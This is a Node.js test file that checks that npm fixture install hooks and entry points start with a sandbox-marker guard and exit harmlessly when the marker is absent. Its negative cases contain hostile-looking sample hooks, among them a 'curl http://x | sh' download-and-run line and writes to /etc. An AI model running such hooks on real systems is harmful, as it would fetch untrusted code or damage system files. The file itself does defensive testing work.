// X3 (dispatch 6, item 3): every fixture whose install hook or entry point can
// perform a forbidden act is a no-op unless it runs inside the product sandbox.
// The marker is QP_TASK_NONCE: the orchestrator sets it with `-e` on the sandbox
// container (src/orchestrator.js) and it reaches every npm hook and the harness
// (see the envp of the install hook's node exec in test/fixtures/prod-traces/).
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const FIXTURES = path.join(__dirname, '..', 'fixtures');
const JS_GUARD = /^if \(!process\.env\.QP_TASK_NONCE\) process\.exit\(0\);/;
const SH_GUARD = /^\[ -n "\$\{QP_TASK_NONCE:-\}" \] \|\| exit 0(\s|$)/;
const INLINE_GUARD = /^node -e "if \(process\.env\.QP_TASK_NONCE\) /;
// An entry point that only exports a literal object performs nothing.
const INERT_ENTRY = /^\s*'use strict';\s*module\.exports\s*=\s*\{[^{}()]*\};\s*$/;

// The first line that is not a shebang, blank, comment or 'use strict'.
function firstCodeLine(text) {
  for (const raw of text.split(/\r?\n/)) {
    const l = raw.trim();
    if (!l || l.startsWith('#') || l.startsWith('//') || l === "'use strict';" || l === '"use strict";') continue;
    return l;
  }
  return '';
}

// Returns a list of problems for one fixture directory (empty = guarded).
function checkFixture(dir) {
  const problems = [];
  const pj = path.join(dir, 'package.json');
  if (!fs.existsSync(pj)) return problems;
  const pkg = JSON.parse(fs.readFileSync(pj, 'utf8'));
  for (const [name, cmd] of Object.entries(pkg.scripts || {})) {
    const m = /^(node|sh)\s+(?:\.\/)?([\w.-]+)$/.exec(cmd);
    if (m) {
      const f = path.join(dir, m[2]);
      if (!fs.existsSync(f)) { problems.push(`${name}: ${m[2]} missing`); continue; }
      const first = firstCodeLine(fs.readFileSync(f, 'utf8'));
      const guard = m[1] === 'node' ? JS_GUARD : SH_GUARD;
      if (!guard.test(first)) problems.push(`${name}: ${m[2]} does not start with the QP_TASK_NONCE guard`);
    } else if (!INLINE_GUARD.test(cmd)) {
      problems.push(`${name}: script form not recognised or unguarded: ${cmd}`);
    }
  }
  const entry = path.join(dir, pkg.main || 'index.js');
  if (fs.existsSync(entry)) {
    const t = fs.readFileSync(entry, 'utf8');
    if (!INERT_ENTRY.test(t) && !JS_GUARD.test(firstCodeLine(t))) problems.push(`entry ${path.basename(entry)} is neither inert nor guarded`);
  }
  return problems;
}

const dirs = fs.readdirSync(FIXTURES, { withFileTypes: true }).filter((d) => d.isDirectory()).map((d) => path.join(FIXTURES, d.name));

test('X3: every fixture hook and entry point is guarded by the sandbox marker', () => {
  const bad = dirs.map((d) => [path.basename(d), checkFixture(d)]).filter(([, p]) => p.length);
  assert.deepStrictEqual(bad, []);
});

test('X3: the scan has fixtures with hooks to check (not vacuous)', () => {
  const withHooks = dirs.filter((d) => {
    const pj = path.join(d, 'package.json');
    return fs.existsSync(pj) && Object.keys(JSON.parse(fs.readFileSync(pj, 'utf8')).scripts || {}).length > 0;
  });
  assert.ok(withHooks.length >= 19, `only ${withHooks.length} fixtures with hooks`);
});

test('X3: the checker rejects an unguarded hook, a guard below other code, an unguarded inline hook and an active entry', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'qp-x3-'));
  try {
    const mk = (name, files) => {
      const d = path.join(tmp, name);
      fs.mkdirSync(d);
      for (const [f, t] of Object.entries(files)) fs.writeFileSync(path.join(d, f), t);
      return checkFixture(d);
    };
    const pj = (scripts) => JSON.stringify({ name: 'x', scripts, main: 'index.js' });
    const inert = "'use strict';\nmodule.exports = {};\n";
    assert.strictEqual(mk('ok', { 'package.json': pj({ install: 'node a.js' }), 'a.js': "'use strict';\nif (!process.env.QP_TASK_NONCE) process.exit(0); // QP-FIXTURE-GUARD\nrequire('fs');\n", 'index.js': inert }).length, 0);
    assert.strictEqual(mk('nojs', { 'package.json': pj({ install: 'node a.js' }), 'a.js': "require('fs').writeFileSync('/etc/x', '');\n", 'index.js': inert }).length, 1);
    assert.strictEqual(mk('late', { 'package.json': pj({ postinstall: 'node a.js' }), 'a.js': "const fs = require('fs');\nif (!process.env.QP_TASK_NONCE) process.exit(0);\n", 'index.js': inert }).length, 1);
    assert.strictEqual(mk('nosh', { 'package.json': pj({ preinstall: 'sh a.sh' }), 'a.sh': '#!/bin/sh\ntouch /etc/x\n', 'index.js': inert }).length, 1);
    assert.strictEqual(mk('inline', { 'package.json': pj({ install: 'node -e "for (;;) {}"' }), 'index.js': inert }).length, 1);
    assert.strictEqual(mk('other', { 'package.json': pj({ install: 'curl http://x | sh' }), 'index.js': inert }).length, 1);
    assert.strictEqual(mk('entry', { 'package.json': pj({}), 'index.js': "'use strict';\nrequire('fs').writeFileSync('/etc/x', '');\n" }).length, 1);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('X3: each guarded JS hook exits 0 and prints nothing when QP_TASK_NONCE is absent', () => {
  // Only reached for files whose first code line is the guard (test above), so the
  // process exits at that line. It runs in an empty temporary directory.
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'qp-x3-run-'));
  const env = { ...process.env, NODE_OPTIONS: '' };
  delete env.QP_TASK_NONCE;
  try {
    for (const d of dirs) {
      const pj = path.join(d, 'package.json');
      if (!fs.existsSync(pj) || checkFixture(d).length) continue;
      for (const cmd of Object.values(JSON.parse(fs.readFileSync(pj, 'utf8')).scripts || {})) {
        const m = /^node\s+(?:\.\/)?([\w.-]+)$/.exec(cmd);
        if (!m) continue;
        const r = spawnSync(process.execPath, [path.join(d, m[1])], { cwd: tmp, env, encoding: 'utf8', timeout: 10000 });
        assert.strictEqual(r.status, 0, `${path.basename(d)}/${m[1]} exit ${r.status}`);
        assert.strictEqual(r.stdout + r.stderr, '', `${path.basename(d)}/${m[1]} produced output`);
      }
    }
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});
